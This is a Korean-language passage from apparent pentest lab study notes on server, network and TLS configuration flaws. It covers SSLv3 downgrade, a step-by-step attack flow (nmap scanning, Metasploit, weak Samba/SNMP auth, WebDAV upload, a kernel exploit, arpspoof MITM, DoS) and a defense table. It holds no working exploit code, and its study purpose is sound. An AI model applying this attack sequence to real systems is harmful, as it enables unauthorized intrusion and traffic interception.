**왜 중요한가**: "구버전 프로토콜을 호환성 때문에 계속 켜두는" 흔한 운영 관행 자체가 공격 벡터가 된다는 걸 보여줍니다. 클라이언트/서버 둘 다 최신 버전을 지원해도, **둘 중 하나라도 구버전을 "켜두기만" 하면** 다운그레이드를 통해 약점이 다시 열립니다.

**방어**: 서버에서 SSLv3를 완전히 비활성화(TLS 1.2 이상만 허용)하고, 클라이언트 측에서는 다운그레이드 방지를 위한 `TLS_FALLBACK_SCSV` 같은 보호 기법을 지원하는 환경을 사용합니다.

## 전체 공격 흐름 한눈에 보기

A5·A6를 모아보면, 사실 하나의 일관된 흐름을 따르고 있습니다.

```
① 정찰: nmap -sC -A -p- 로 "뭐가 열려있는지" 전체 파악
        ↓
② 버전/설정 확인: 서비스 버전, SSL/TLS 설정, 인증 방식(기본 계정/community string 등) 확인
        ↓
③ 알려진 약점 매칭: Metasploit 모듈 검색, Exploit-DB, O-Saft/testssl.sh 같은
   "이미 알려진 취약점을 자동으로 찾아주는" 도구 활용
        ↓
④ 초기 침투: 약한 인증(FTP/Samba/SNMP) 또는 업로드 가능한 기능(WebDAV)으로 발판 마련
        ↓
⑤ 권한 상승 / 추가 정보 탈취: 커널 익스플로잇(sendpage), MITM(arpspoof)으로 트래픽 가로채기
        ↓
⑥ 가용성 공격(DoS류): 위 단계들과 별개로, 시스템을 멈추는 것 자체가 목적인 공격군
```

A1~A4가 "애플리케이션 코드 레벨"의 문제였다면, A5~A6는 **"서버/네트워크/암호화 설정 레벨"**의 문제라는 게 가장 큰 차이입니다. 그래서 도구도 Burp(코드 레벨 조작)보다는 **nmap·Metasploit·sslscan류(설정/버전 레벨 진단)**가 중심이 됩니다.

## 방어 대책 총정리

| 영역 | 핵심 대책 |
|------|-----------|
| 파일 공유(Samba) | `wide links no`, `follow symlinks no`, 익명 접근 차단 |
| HTTP 메서드 | TRACE/TRACK 비활성화, 불필요한 메서드(PUT, DELETE) 제거 |
| DoS류 | 타임아웃 단축, 동시 연결 수 제한, SSL 재협상 비활성화, WAF 레이트리밋 |
| 인증/브루트포스 | 계정 잠금 정책, 기본 계정/기본 community string 변경 |
| 파일 업로드(WebDAV) | 인증 강제, 업로드 디렉토리 실행 권한 제거 |
| 권한상승 | OS/커널 정기 패치 |
| MITM | HTTPS 강제, 스위치 ARP Inspection |
| 잔존 파일 | 배포 자동화로 불필요 파일 제거, 디렉토리 리스팅 차단 |
| SSL/TLS | TLS 1.2 이상만 허용, 압축 비활성화, 최신 OpenSSL 유지, 취약 시 키 재발급 |
